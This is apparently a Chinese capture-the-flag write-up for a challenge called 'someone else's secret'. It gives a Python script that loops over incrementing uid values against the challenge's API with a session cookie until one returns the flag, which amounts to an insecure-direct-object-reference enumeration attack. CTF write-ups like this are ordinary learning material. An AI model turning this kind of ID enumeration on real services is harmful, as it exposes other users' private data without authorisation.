第五题： 别人的秘密

 http://45.113.201.36/user.html

  只提供了一条有效文件，并且给出uid=100336889这一参数。

  分析代码后没有得出有效信息，需要暴力破解。

import requests
import json
uid = 100336889
headers = {
    "Cookie": "对应填入",
    "Referer": "http://45.113.201.36/user.html",
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
}
while True:
    resp = requests.get("http://45.113.201.36/api/ctf/5?uid="+str(uid),headers=headers)
    print(uid)
    print(resp.text)
    jsonobj = json.loads(resp.text)
    if jsonobj['code'] == 200:
        print("找到你了！")
        break
    else:
        uid += 1
        continue

  循环几十次后便可得到flag。
